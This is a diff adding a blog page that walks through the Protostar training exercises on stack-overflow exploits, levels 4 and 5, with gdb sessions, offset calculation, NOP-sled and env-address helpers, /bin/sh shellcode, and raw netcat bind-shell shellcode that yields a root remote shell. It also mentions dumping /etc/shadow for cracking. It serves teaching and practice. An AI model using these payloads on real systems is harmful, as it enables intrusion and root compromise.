@@ -1,0 +1,365 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Protostar Stack Exploits (Solutions 4-5) - Louis Li</title>
+	<meta name="author" content="Louis Li">
+
+	
+	<meta name="description" content="Protostar Stack Exploits (Solutions 4-5) Overview Protostar is a series of exercises from Exploit Exercises. In addition to three final levels, it &hellip;">
+	
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<link href="http://feeds.feedburner.com/louisligithub" rel="alternate" title="Louis Li" type="application/atom+xml">
+	
+	<link rel="canonical" href="http://louisrli.github.io/blog/2012/08/24/protostar-stack1/">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	<link href='http://fonts.googleapis.com/css?family=Open+Sans:400italic,400,700' rel='stylesheet' type='text/css'>
+	<!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+</head>
+
+
+<body>
+	<div class="container">
+		<div class="left-col">
+			<div class="intrude-less">
+			<header id="header" class="inner"><div class="profilepic">
+	<script src="/javascripts/md5.js"></script>
+	<script type="text/javascript">
+		$(function(){
+			$('.profilepic').append("<img src='http://www.gravatar.com/avatar/" + MD5("louisrli@gmail.com") + "?s=160' alt='Profile Picture' style='width: 160px;' />");
+		});
+	</script>
+</div>
+<hgroup>
+  <h1><a href="/">Louis Li</a></h1>
+  
+</hgroup>
+
+<p class="subtitle"></p>
+<nav id="main-nav"><ul class="main-navigation">
+  <li><a href="/blog">Blog</a></li>
+  <li><a href="/blog/2013/01/12/sideprojects-2012/">Sideprojects</a></li>
+  <li><a href="http://github.com/louisrli">Github</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+<nav id="sub-nav">
+	<div class="social">
+		
+		
+		<a class="google" href="https://plus.google.com/106125247318074050350" rel="author" title="Google+">Google+</a>
+		
+		
+		
+		<a class="github" href="https://github.com/louisrli" title="GitHub">GitHub</a>
+		
+		
+		
+		
+		
+		
+		
+		
+		<a class="rss" href="http://feeds.feedburner.com/louisligithub" title="RSS">RSS</a>
+		
+	</div>
+</nav>
+</header>				
+			</div>
+		</div>	
+		<div class="mid-col">
+			
+				
+			
+			<div class="mid-col-container">
+				<div id="content" class="inner"><article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+	<h1 class="title" itemprop="name">Protostar Stack Exploits (Solutions 4-5)</h1>
+	<div class="entry-content" itemprop="articleBody"><h1>Overview</h1>
+
+<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
+
+<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (&ldquo;Stack&rdquo;). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels. This is the second of three posts for Stack.</p>
+
+<h1>Solutions</h1>
+
+<h2>Stack: Level 4</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack4">full</a>): Overwrite the <a href="http://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture#Instruction_Pointer">eip register</a> to change execution flow.</p>
+
+<p>First, we want to find the offset to the return address. We can explore using gdb and a breakpoint on <code>main</code>.</p>
+
+<div>
+  <pre><code class='console'>$ gdb ./stack4</code></pre>
+</div>
+
+
+
+
+<!-- more -->
+
+
+<div>
+  <pre><code class='text'>(gdb) break main
+Breakpoint 1 at 0x8048411: file stack4/stack4.c, line 15.
+(gdb) run
+Starting program: /opt/protostar/bin/stack4
+
+Breakpoint 1, main (argc=1, argv=0xbffff874) at stack4/stack4.c:15
+15      stack4/stack4.c: No such file or directory.
+in stack4/stack4.c
+(gdb) next
+AAAA
+16      in stack4/stack4.c
+(gdb) info frame
+Stack level 0, frame at 0xbffff7d0:
+eip = 0x804841d in main (stack4/stack4.c:16); saved eip 0xb7eacc76
+source language c.
+Arglist at 0xbffff7c8, args: argc=1, argv=0xbffff874
+Locals at 0xbffff7c8, Previous frame's sp is 0xbffff7d0
+Saved registers:
+ebp at 0xbffff7c8, eip at 0xbffff7cc
+(gdb) x/32xw $esp
+0xbffff770:     0xbffff780      0xb7ec5165      0xbffff788      0xb7eaca75
+0xbffff780:     0x41414141      0x08049500      0xbffff798      0x080482e8
+0xbffff790:     0xb7ff1040      0x080495ec      0xbffff7c8      0x08048449
+0xbffff7a0:     0xb7fd7304      0xb7fd6ff4      0x08048430      0xbffff7c8
+0xbffff7b0:     0xb7ec5365      0xb7ff1040      0x0804843b      0xb7fd6ff4
+0xbffff7c0:     0x08048430      0x00000000      0xbffff848      0xb7eacc76
+0xbffff7d0:     0x00000001      0xbffff874      0xbffff87c      0xb7fe1848
+0xbffff7e0:     0xbffff830      0xffffffff      0xb7ffeff4      0x0804824b
+(gdb) p 0xbffff7cc - 0xbffff780
+= 76
+(gdb) info address win
+Symbol &quot;win&quot; is a function at address 0x80483f4.</code></pre>
+</div>
+
+
+<ul>
+<li><code>info frame</code>: Shows the normal location of the saved instruction pointer, <code>eip</code>: <code>0xb7eacc76</code>.</li>
+<li><code>x/32xw $esp</code>: Examines the current stack frame. The buffer starts at <code>0xbffff780</code> with <code>0x414141</code> (AAAA).</li>
+<li><code>p 0xbffff7cc - 0xbffff780</code>: Calculates <code>&amp;eip - &amp;buffer</code>, giving an offset to eip.
+Using the offset calculated above, <code>eip</code> is redirected to the address of <code>win()</code> function.</li>
+</ul>
+
+
+<div>
+  <pre><code class='console'>$ echo -e &quot;$(perl -e &quot;print 'A'x76&quot;)\xf4\x83\x04\x08&quot; | ./stack4
+code flow successfully changed
+Segmentation fault</code></pre>
+</div>
+
+
+<h2>Stack: Level 5</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack5">full</a>): Use buffer overflow to execute shellcode on a suid root program, <code>stack5</code>.</p>
+
+<h3>Utilities</h3>
+
+<p><code>~/nop</code>:</p>
+
+<div>
+  <pre><code class='perl'>#!/usr/bin/perl
+# Prints argv[0] number of NOP instructions to stdout
+print &quot;\x90&quot;x$ARGV[0]</code></pre>
+</div>
+
+
+<p><code>~/envaddr.c</code>:</p>
+
+<div>
+  <pre><code class='c'>// Prints the approximate address of an environmental variable
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main(int argc, char **argv) {
+    char *addr = getenv(argv[1]);
+    if (addr == NULL) {
+        printf(&quot;%s not found\n&quot;, argv[1]);
+        return 1;
+    }
+    else {
+        printf(&quot;%s is at address %p\n&quot;, argv[1], getenv(argv[1]));
+    }
+}</code></pre>
+</div>
+
+
+<p>These utilities will be used in future solutions as well.</p>
+
+<h3>Solution</h3>
+
+<h4>Overview</h4>
+
+<p>From a high level, this is our approach:
+1. Store the shellcode in an environmental variable.
+2. Find the approximate address of the environmental variable on the stack.
+3. Overwriting the return address in <code>stack5</code> with the address of the environmental variable, we execute the shellcode.</p>
+
+<p>There are various ways to execute shellcode, but it&rsquo;s more reliable to keep the shellcode in an environmental variable rather than the buffer in case it&rsquo;s larger than the buffer (64 bytes).</p>
+
+<h4>Executing <code>/bin/sh</code></h4>
+
+<p>The shellcode is a modified version of the code from <em>Hacking: The Art of Exploitation</em>. It runs the command <code>/bin//sh -sli</code>.</p>
+
+<div>
+  <pre><code class='nasm'>BITS 32
+
+xor eax, eax
+push eax
+push 0x68732f2f   ; chars for /bin//sh
+push 0x6e69622f
+mov ebx, esp
+push eax
+mov edx, esp
+
+push eax
+push 0x736c692d   ; -sli flags
+push eax
+mov ecx, esp
+mov al, 11
+int 0x80</code></pre>
+</div>
+
+
+<p>We&rsquo;ll overwrite the return address with the address of our shellcode environmental variable.</p>
+
+<div>
+  <pre><code class='console'>$ export SC=$(echo -n $(~/nop 100)$(cat /home/user/shell))
+$ ~/envaddr SC
+SC is at address 0xbffffefa
+$ echo -n $(perl -e 'print &quot;\xfa\xfe\xff\xbf&quot;x25') | /opt/protostar/bin/stack5</code></pre>
+</div>
+
+
+<p>Nothing happened! Let&rsquo;s take a look with GDB.</p>
+
+<div>
+  <pre><code class='text'>[user@protostar:~]$ echo -n $(perl -e 'print &quot;\xfa\xfe\xff\xbf&quot;x25') &gt; /tmp/sc-shell
+[user@protostar:~]$ gdb /opt/protostar/bin/stack5
+Reading symbols from /opt/protostar/bin/stack5...done.
+(gdb) run &lt; /tmp/sc-shell
+Starting program: /opt/protostar/bin/stack5 &lt; /tmp/sc-shell
+Executing new program: /bin/dash
+
+Program exited normally.</code></pre>
+</div>
+
+
+<p>The shell opens, but it exits immediately. The shellcode is executing, but there&rsquo;s another issue: as documented <a href="http://stackoverflow.com/questions/10767070/buffer-overflow-program-terminates-after-spawning-a-shell">here</a> and <a href="http://forums.freebsd.org/showthread.php?t=10054">here</a>, opening shells from stdin is problematic.</p>
+
+<h4>Opening a shell through netcat</h4>
+
+<p>We know that our shellcode does run, but it can&rsquo;t open a shell. However, there are a wide a wide array of exploits available besides running <code>/bin/sh</code>. We could dump <a href="http://en.wikipedia.org/wiki//etc/shadow">/etc/shadow/</a> and use <a href="http://www.openwall.com/john/">John the Ripper</a> to crack the passwords. Another option is to open up a remote shell through <a href="http://linux.die.net/man/1/nc">netcat</a>. We&rsquo;ll use the netcat solution.</p>
+
+<p>Using <a href="http://shell-storm.org/shellcode/files/shellcode-684.php">netcat shellcode</a>, we go through the same process <a href="https://gist.github.com/9e403a2889a07eeb84a9">(plaintext gist)</a>:</p>
+
+<div>
+  <pre><code class='console'>$ echo -ne &quot;\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08\x89\x5e\x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d\x56\x26\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d\x6c\x70\x38\x30\x38\x30\x23\x2d\x65\x2f\x62\x69\x6e\x2f\x73\x68\x23&quot; &gt; ~/sc-nc-8080
+$ export SC=$(echo -ne $(~/nop 100)$(cat /home/user/sc-nc-8080))
+$ ~/envaddr SC
+SC is at address 0xbffffece
+$ echo -n $(perl -e 'print &quot;\xce\xfe\xff\xbf&quot;x25') | /opt/protostar/bin/stack5
+&lt;waiting&gt;</code></pre>
+</div>
+
+
+<p>On another machine, complete the newly waiting connection:</p>
+
+<div>
+  <pre><code class='console'>$[louis@neutrino ~]$ nc 192.168.1.10 8080
+whoami
+root</code></pre>
+</div>
+
+
+
+</div>
+
+</article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	
+	<a class="addthis_button_tweet"></a>
+	
+	
+	<a class="addthis_counter addthis_pill_style"></a>
+	</div>
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
+</div>
+
+
+
+<section id="comment">
+    <h1 class="title">Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</section>
+</div>
+			</div>
+			<footer id="footer" class="inner"><p>
+  Copyright &copy; 2013 - Louis Li -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+Design credit: <a href="http://shashankmehta.in/archive/2012/greyshade.html">Shashank Mehta</a></footer>
+			<script src="/javascripts/slash.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+<script type="text/javascript">
+      var disqus_shortname = 'louisrli';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://louisrli.github.io/blog/2012/08/24/protostar-stack1/';
+        var disqus_url = 'http://louisrli.github.io/blog/2012/08/24/protostar-stack1/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+	<script type="text/javascript">
+		var _gaq = _gaq || [];
+		_gaq.push(['_setAccount', 'UA-32823730-1']);
+		_gaq.push(['_trackPageview']);
+
+		(function() {
+			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+		})();
+	</script>
+
+
+
+
+		</div>
+	</div>
+</body>
+</html>
